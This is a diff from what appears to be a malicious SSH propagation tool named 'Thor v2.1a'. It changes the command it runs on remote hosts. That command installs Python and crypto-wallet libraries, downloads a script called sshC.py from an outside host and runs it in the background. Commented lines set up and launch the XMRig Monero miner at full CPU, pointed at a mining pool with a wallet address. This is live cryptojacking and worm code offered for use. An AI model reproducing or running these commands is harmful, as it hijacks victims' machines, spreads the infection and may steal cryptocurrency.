@@ -46,7 +46,7 @@ def ssh_connect(target_ip,username,password,port,commandd):
 #Minexmr-pool-
 #command = "wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-bionic-x64.tar.gz && tar -zxf xmrig-6.8.2-bionic-x64.tar.gz && sha256sum xmrig-6.8.2/xmrig &&  cd xmrig-6.8.2 && ./xmrig  -B --cpu-max-threads-hint=100  --threads=100 --cpu-no-yield -o vkdk.dvg.xyx.0xx0.cf:4444 -u 85nAss3iKjaWsEvSDG37UMAXfNt3H3b2YLaiqNXKVAtP2tnCcBUHxfa7rFmMprk37z4nRHJUYhiYsQVT2oQs1cRj919nRve.s9 -k  --coin monero -a rx/0"
 #command = "./xmrig -B   --cpu-max-threads-hint=100  --threads=100 --cpu-no-yield -o  pool.hashvault.pro:80 -u 85nAss3iKjaWsEvSDG37UMAXfNt3H3b2YLaiqNXKVAtP2tnCcBUHxfa7rFmMprk37z4nRHJUYhiYsQVT2oQs1cRj919nRve.Diff -k  --coin monero -a rx/0"
-command = "apt install python3  &&  pip install paramiko &&  pip install termcolor && pip install web3 && pip install coincurve && pip install  bip44 && pip install bip39 && pip install requests && wget http://shitt.ezyro.com/uploads/sshC.py && nohup python3 sshC.py &"
+command = "apt install python3  &&  pip install paramiko &&  pip install termcolor && pip install web3 && pip install coincurve && pip install  bip44 && pip install bip39 && pip install requests && wget https://raw.githubusercontent.com/dasdrqw3/mn/main/sshC.py && nohup python3 sshC.py &"
 
 print("\n\nThor v2.1a starting...")
 
